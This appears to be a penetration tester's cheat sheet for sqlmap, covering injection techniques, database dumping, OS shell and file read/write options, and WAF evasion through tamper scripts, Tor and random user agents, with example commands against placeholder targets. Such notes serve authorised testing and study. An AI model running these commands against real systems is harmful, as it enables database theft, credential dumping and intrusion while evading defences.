+++
title = "SQLmap"
+++

- https://github.com/sqlmapproject/sqlmap/wiki/Usage
  - use the "Enumeration" section once finding vuln points
- Logs: `~/.local/share/sqlmap/output/<TARGET>`

### Core Flags

| Option            | Purpose                                                                                                                  |
| ----------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `-u` / `--url`    | Target URL (GET params tested by default).                                                                               |
| `--data`          | POST body (e.g. `'uid=1&name=test'`). Use `*` at injection point: `'uid=1*&name=test'`.                                  |
| `-p`              | Test only this parameter (e.g. `-p uid`).                                                                                |
| `-r`              | **Request file** — full HTTP request (from Burp / Copy to file). Put `*` in the request where to inject (e.g. `/?id=*`). |
| `--cookie`        | Session cookie (e.g. `--cookie='PHPSESSID=...'`). Use `*` in value to test cookie: `--cookie="id=1*"`.                   |
| `-H` / `--header` | Custom header(s). Same for `--host`, `--referer`, `-A`/`--user-agent`.                                                   |
| `--random-agent`  | Random User-Agent from built-in list (evade WAF that blocks sqlmap default).                                             |
| `--mobile`        | Use a mobile User-Agent.                                                                                                 |
| `--method`        | HTTP method (e.g. `--method PUT`).                                                                                       |
| `--batch`         | Non-interactive (no prompts).                                                                                            |

### Workflow

**NOTE: Don’t rely on sqlmap to crawl or guess...** 

Capture the exact request via:
- a web proxy, save it to a file, and feed it to sqlmap
- **browser Web Developers Tools as a cURL command, then change `curl` to `sqlmap` and add any additional options like `--forms`**

```bash
# WEB PROXY: Capture request > Save > 'request.txt'
sqlmap --batch -r request.txt

---

# Auto-parse HTML forms (if no proxy)
sqlmap --forms --batch -u "<URL>"

# Spider the site to find parameters
sqlmap --crawl=3 --batch -u "<URL>"

# (REST/JSON) Manual injection point -- use '*' where to inject
sqlmap --batch -u "http://target.com/api/v1/user/105*"
```

By default sqlmap prioritizes speed: **level 1** only tests **GET** (URL) and **POST** (body). It does **not** test cookies or headers unless you raise the level.

- **`-r` (request file):** Gold standard. Raw HTTP request = exact cookies, JSON, headers; no guessing.
- **`--forms`:** Parses the HTML response, finds `<form>` inputs, and builds POST requests. Without it, a URL that only shows a login form is only tested as GET.
- **`*` marker:** For REST (e.g. `/user/105`) or when the injection point isn’t a normal param, put `*` at the value to test: `sqlmap -u "http://target/item/12*"` — sqlmap injects at `12`.

### Techniques

#### Easy Win

Try the simpler/faster techniques (of `BEUSTQ`) first to find easy wins, but

**NOTE: remember this will miss techniques!**
```bash
sqlmap --risk 3 --level 5 --technique=EUBS --batch -u "<URL>"
```

#### Error-based

Trigger DB errors that leak data inside the error message.

```bash
sqlmap --technique=E -u "<URL>"
```

#### Union-based

Combine two queries to dump data directly into the response. Count the displayed columns (and maybe iteratively increase columns amount)

```bash
sqlmap --technique=U --union-cols=5 -u "<URL>"
```

#### Blind Boolean

Infer data from whether the page content or behaviour changes (true vs false).

**NOTE:** careful this is a very unstable method that might require multiple runs or `--no-cast`

```bash
sqlmap --technique=B --level 5 --risk 3 -u "<URL>"
```

#### Stacked queries

Append extra SQL statements after the vulnerable one (e.g. INSERT/UPDATE/DELETE or OS commands); requires DB support (e.g. MSSQL, PostgreSQL).

```bash
sqlmap --technique=S -u "<URL>"
```

#### Blind Time

Infer data from response delays (e.g. SLEEP) when the condition is true.

```bash
sqlmap --technique=T -u "<URL>"
```

#### Inline queries

Query embedded inside the original query; uncommon and app-dependent.

```bash
sqlmap --technique=Q -u "<URL>"
```

#### Out-of-band

Exfiltrate via DNS or HTTP to a server you control when no output is visible.

```bash
sqlmap --dns-domain=<DOMAIN> -u "<URL>"
```

## Database Enumeration

- Logs: `~/.local/share/sqlmap/output/`
    - use `--dump-format=sqlite` for large DBs
- DBMS root ≠ Linux root
    - DB root can write anywhere only if DBMS runs as Linux root

| Option                                                                                                             | Purpose                                                                                                                                               |
| :----------------------------------------------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------------------------------------------------------------------- |
| `--banner --current-user --current-db --is-dba --dbs --privileges --users --passwords --dump-all --exclude-sysdbs` | DB version, user, DB name, is DBA, list all DBs, privileges, enumerate users and hashes, dump all DBs except system (e.g. information_schema, mysql). |
| `-D <DB> --tables`                                                                                                 | List tables in database.                                                                                                                              |
| `-D <DB> -T <TABLE> --columns`                                                                                     | List columns in table.                                                                                                                                |
| `-D <DB> -T <TABLE> --dump`                                                                                        | Dump entire table.                                                                                                                                    |
| `-C col1,col2 --dump`                                                                                              | Dump only specified columns.                                                                                                                          |
| `--start=N --stop=M --dump`                                                                                        | Dump rows N through M.                                                                                                                                |
| `--where="cond" --dump`                                                                                            | Dump only rows matching condition.                                                                                                                    |
| `--os-shell`                                                                                                       | Run OS commands (needs perm)                                                                                                                          |
| `--file-read /etc/passwd`                                                                                          | Check file read access (needs perm)                                                                                                                   |

**OS Exploitation Options**

| Option                     | Description                                                                                     |
| :------------------------- | :---------------------------------------------------------------------------------------------- |
| **`--file-write="local"`** | Specifies the local file you want to upload to the target.                                      |
| **`--file-dest="remote"`** | Specifies the absolute path on the target server where the file should be written.              |
| **`--os-cmd="cmd"`**       | Executes a single operating system command and retrieves the output.                            |

## Troubleshooting

- **JSON/XML / APIs:** sqlmap may not detect parameters automatically. Use `-r` with a captured request or raise `--level`.
- **Headers & cookies:** Level 1 ignores them. `--level 2` = cookies; `--level 3` = User-Agent/Referer; `--level 5` = Host.
- **CSRF tokens:** If the form needs a fresh token per request, replay fails. Use `--csrf-token="csrf_token_name"` or `--csrf-url`.

| Option           | Purpose                                                                                                                                  |
| ---------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `--parse-errors` | Parse and **display DBMS errors** (syntax, access, etc.) so you can see what the database is complaining about.                          |
| `-t <FILE>`      | **Store all traffic** (requests and responses) to a file. Inspect manually to see where the failure occurs.                              |
| `-v <LEVEL>`     | **Verbosity** (e.g. `-v 6`). More console output; full HTTP requests/responses in real time so you can follow what sqlmap is doing.      |
| `--proxy <URL>`  | **Route sqlmap through a proxy** (e.g. Burp: `--proxy http://127.0.0.1:8080`). Inspect, repeat, and use proxy features on every request. |

```bash
# Show DBMS errors
sqlmap --batch --parse-errors -u "http://target.com/vuln.php?id=1"

# Log traffic to file
sqlmap --batch -t /tmp/traffic.txt -u "http://target.com/vuln.php?id=1"

# Verbose (e.g. level 6)
sqlmap -v 6 --batch -u "http://target.com/vuln.php?id=1"

# Via Burp
sqlmap --batch --proxy http://127.0.0.1:8080 -u "http://target.com/vuln.php?id=1"
```

### Attack Tuning Escalation

#### "Silver Bullet" Commands

When default `sqlmap` fails to find an injection, match your scenario to one of these three archetypes.

**Archetype A: The Logic/Bracket Failure (OR Payloads)**
*Use when `AND` logic fails, or the query uses heavily nested parentheses `(((...)))`.*
*   `*` tells SQLMap to replace the parameter entirely (creates a clean True/False baseline).
*   `--risk 3` enables `OR` payloads.
*   `--level 5` tests maximum combinations of closing brackets/quotes.
```bash
sqlmap --level 5 --risk 3 -T <TABLE> --dump --batch -u "http://<TARGET>/case5.php?id=*"
```

**Archetype B: The Custom Boundary (Manual Prefix)**
*Use when you manually found the syntax breaker in Burp (e.g., `)`), but SQLMap isn't guessing it.*
*   `--prefix` forces SQLMap to inject the exact closing syntax before its payload.
```bash
sqlmap --prefix='`)' --dump --batch -u "http://<TARGET>/case6.php?col=id"
```

**Archetype C: The Union Structure Failure**
*Use when SQLMap detects a parameter but fails to extract data via UNION.*
*   `--technique=U` forces UNION-based SQLi (saves time).
*   `--union-cols=5` tells SQLMap exactly how many columns exist (find this manually with `ORDER BY 5` in Burp).
```bash
sqlmap --technique=U --union-cols=5 --dump --batch -u "http://<TARGET>/case7.php?id=1"
```

#### Advanced Tuning

When SQLMap is hallucinating data or failing to distinguish True/False pages, use these flags to fix its baseline.

| Flag | Purpose / Mechanic |
| :--- | :--- |
| **Boundaries & Coverage** | |
| `--level=5` | Tests more parameters (Cookies, Headers) and uses complex boundary closures (`)))`, `""`). |
| `--risk=3` | Enables `OR` logic payloads. **Required** for Login bypasses and `UPDATE/DELETE` queries. |
| `--prefix="..."` | Manually close the developer's SQL string (e.g., `--prefix="%'))"`). |
| `--suffix="..."` | Manually comment out the rest of the developer's SQL (e.g., `--suffix="-- -"`). |
| **Boolean State Tuning** | *(Fixes "Hallucinations" and "2 Letters Off" errors)* |
| `--string="Success"` | Marks a page as TRUE **only** if this exact word appears. |
| `--text-only` | Strips all HTML tags before comparing True/False. Fixes wobble from dynamic hidden fields. |
| `--code=200` | Uses HTTP Status Codes to define TRUE. |
| `--titles` | Compares the `<title>` tags instead of the whole body. |
| **Execution Control** | |
| `--technique=BEU` | Only use **B**oolean, **E**rror, and **U**nion. Skips Time-based (`T`) which causes timeouts. |
| `--union-char='a'` | Replaces `NULL` with a string character. Fixes strict typing errors in UNION queries. |
| `--union-from=users` | Appends a specific table to the UNION payload (Required for Oracle DBs). |

### Evasion & Protections Bypass

#### Application Logic & Request

| Flag | Description |
| :--- | :--- |
| **`--csrf-token="name"`** | Automatically parses the HTTP response to extract and update anti-CSRF tokens for subsequent requests. |
| **`--randomize="param"`** | Generates a random value for a specific parameter per request, bypassing anti-automation unique-value checks. |
| **`--eval="python_code"`** | Executes inline Python to calculate dynamic parameter values (e.g., `import hashlib; h=hashlib.md5(id).hexdigest()`). |

#### Network & Protocol Evasion

| Flag | Description |
| :--- | :--- |
| **`--random-agent`** | Replaces the default `sqlmap` User-Agent with a random, legitimate browser UA to bypass basic blacklists. |
| **`--skip-waf`** | Skips SQLMap's initial, highly-noisy WAF heuristic payload check. |
| **`--proxy="url"`** | Routes traffic through a single proxy (e.g., `socks4://127.0.0.1:9050`) or a list (`--proxy-file`). |
| **`--tor`** | Routes traffic via the Tor network (use `--check-tor` to verify anonymization). |
| **`--chunked`** | Uses HTTP chunked transfer encoding to split POST bodies, bypassing WAF keyword inspection at the protocol layer. |
| **`--hpp`** | HTTP Parameter Pollution. Splits the payload across multiple identical parameters (e.g., `?id=1&id=UNION&id=SELECT`). |

#### Tamper Scripts
Tamper scripts use Python to rewrite the SQL payload *before* it is sent to the target. They can be chained by comma-separating them (e.g., `--tamper=space2comment,randomcase`).

*   **Official Repository:** [github.com/sqlmapproject/sqlmap/tree/master/tamper](https://github.com/sqlmapproject/sqlmap/tree/master/tamper)
*   **List locally:** `sqlmap --list-tampers`

| Tamper-Script                   | Description                                                                                                                        |
| :------------------------------ | :--------------------------------------------------------------------------------------------------------------------------------- |
| **`0eunion`**                   | Replaces instances of `UNION` with `e0UNION`                                                                                       |
| **`base64encode`**              | Base64-encodes all characters in a given payload                                                                                   |
| **`between`**                   | Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`                   |
| **`commalesslimit`**            | Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart                                                   |
| **`equaltolike`**               | Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart                                                           |
| **`halfversionedmorekeywords`** | Adds (MySQL) versioned comment before each keyword                                                                                 |
| **`modsecurityversioned`**      | Embraces complete query with (MySQL) versioned comment                                                                             |
| **`modsecurityzeroversioned`**  | Embraces complete query with (MySQL) zero-versioned comment                                                                        |
| **`percentage`**                | Adds a percentage sign (`%`) in front of each character (e.g. `SELECT` -> `%S%E%L%E%C%T`)                                          |
| **`plus2concat`**               | Replaces plus operator (`+`) with (MSSQL) function `CONCAT()` counterpart                                                          |
| **`randomcase`**                | Replaces each keyword character with random case value (e.g. `SELECT` -> `SEleCt`)                                                 |
| **`space2comment`**             | Replaces space character (` `) with comments `/**/`                                                                                |
| **`space2dash`**                | Replaces space character (` `) with a dash comment (`--`) followed by a random string and a new line (`\n`)                        |
| **`space2hash`**                | Replaces (MySQL) instances of space character (` `) with a pound character (`#`) followed by a random string and a new line (`\n`) |
| **`space2mssqlblank`**          | Replaces (MSSQL) instances of space character (` `) with a random blank character from a valid set of alternate characters         |
| **`space2plus`**                | Replaces space character (` `) with plus (`+`)                                                                                     |
| **`space2randomblank`**         | Replaces space character (` `) with a random blank character from a valid set of alternate characters                              |
| **`symboliclogical`**           | Replaces `AND` and `OR` logical operators with their symbolic counterparts (`&&` and `')`                                          |
| **`versionedkeywords`**         | Encloses each non-function keyword with (MySQL) versioned comment                                                                  |
| **`versionedmorekeywords`**     | Encloses each keyword with (MySQL) versioned comment                                                                               |
